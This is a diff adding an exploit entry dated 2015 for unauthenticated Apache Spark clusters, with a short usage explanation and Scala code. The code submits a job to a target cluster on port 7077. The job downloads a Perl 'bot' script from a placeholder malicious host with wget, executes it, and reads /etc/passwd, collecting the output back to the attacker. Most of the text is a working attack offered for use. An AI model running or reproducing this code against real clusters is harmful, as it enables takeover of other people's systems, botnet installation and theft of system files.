@@ -1,0 +1,63 @@
+# Exploit Title: Arbitary Code Execution in Apache Spark Cluster
+# Date: 23/03/2015
+# Exploit Author: AkhlD (AkhilDas) <akhld@live.com> CodeBreach.in
+# Vendor Homepage: https://spark.apache.org/
+# Software Link: https://spark.apache.org/downloads.html
+# Version: All (0.0.x, 1.1.x, 1.2.x, 1.3.x)
+# Tested on: 1.2.1
+
+# Credits: Mayur Rustagi (@mayur_rustagi), Patrick Wendel (@pwendell) for
+reviewing.
+# Reference(s) :
+http://codebreach.in/blog/2015/03/arbitary-code-execution-in-unsecured-apache-spark-cluster/
+# Exploit URL  : https://github.com/akhld/spark-exploit/
+
+# Spark clusters which are not secured with proper firewall can be taken
+over easily (Since it does not have
+# any authentication mechanism), this exploit simply runs arbitarty codes
+over the cluster.
+# All you have to do is, find a vulnerable Spark cluster (usually runs on
+port 7077) add that host to your
+# hosts list so that your system will recognize it (here its
+spark-b-akhil-master pointing
+# to 54.155.61.87 in my /etc/hosts) and submit your Spark Job with arbitary
+codes that you want to execute.
+
+# Language: Scala
+
+
+import org.apache.spark.{SparkContext, SparkConf}
+
+/**
+ * Created by akhld on 23/3/15.
+ */
+
+object Exploit {
+  def main(arg: Array[String]) {
+    val sconf = new SparkConf()
+      .setMaster("spark://spark-b-akhil-master:7077") // Set this to the
+vulnerable host URI
+      .setAppName("Exploit")
+      .set("spark.cores.max", "2")
+      .set("spark.executor.memory", "2g")
+      .set("spark.driver.host","hacked.work") // Set this to your host from
+where you launch the attack
+
+    val sc = new SparkContext(sconf)
+      sc.addJar("target/scala-2.10/spark-exploit_2.10-1.0.jar")
+
+    val exploit = sc.parallelize(1 to 1).map(x=>{
+       //Replace these with whatever you want to get executed
+       val x = "wget https://mallicioushost/mal.pl -O bot.pl".!
+       val y = "perl bot.pl".!
+       scala.io.Source.fromFile("/etc/passwd").mkString
+    })
+    exploit.collect().foreach(println)
+  }
+}
+
+
+
+
+Thanks
+Best Regards
